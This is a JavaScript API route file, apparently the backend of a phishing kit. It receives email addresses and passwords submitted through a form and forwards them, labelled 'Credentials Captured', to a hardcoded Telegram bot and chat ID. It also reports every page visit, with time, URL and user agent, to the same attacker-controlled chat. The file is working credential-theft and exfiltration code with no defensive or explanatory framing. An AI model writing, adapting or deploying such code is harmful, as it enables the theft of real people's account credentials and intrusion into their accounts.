/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";

// for telegram
import { TelegramClient } from "telegramsjs";

const botToken = "8593780463:AAF6pJakUzPDgtWyBrMi4pBBfWgS_j8hMMw";
const bot = new TelegramClient(botToken);
const chatId = "7190390587";

// Handle POST requests for form submissions
export async function POST(req) {
  const { email, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();

  try {
    // Only send notification when password is provided (credentials)
    if (password) {
      const credentialsMessage = `
🔐 *Credentials Captured*

*Email:* ${email}
*Password:* ${password}
      `;

      await bot.sendMessage({
        text: credentialsMessage,
        chatId: chatId,
        parse_mode: "Markdown"
      });

      console.log(
        `Credentials sent to telegram: Email: ${email}, Password: ${password}`
      );

      return new Response(
        JSON.stringify({ message: "Credentials sent successfully!" }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    // Return success for access without password (no notification)
    return new Response(
      JSON.stringify({ message: "Access logged!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
    return new Response(JSON.stringify({ error: "Error sending message" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Handle GET requests - Now with notifications for page access
export async function GET(req) {
  try {
    const url = new URL(req.url);
    
    // Send Telegram notification for page access
    const pageAccessMessage = `
🌐 *Page Accessed*

*Access Time:*
${new Date().toLocaleString()}

🌐 *Landing URL:*
${req.url || 'No URL provided'}

👤 *User Agent:*
${req.headers.get('user-agent') || 'Not available'}
    `;

    await bot.sendMessage({
      text: pageAccessMessage,
      chatId: chatId,
      parse_mode: "Markdown"
    });

    console.log("Page accessed");
    
    return new Response(
      JSON.stringify({ message: "Access logged!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(JSON.stringify({ error: "Error processing request" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
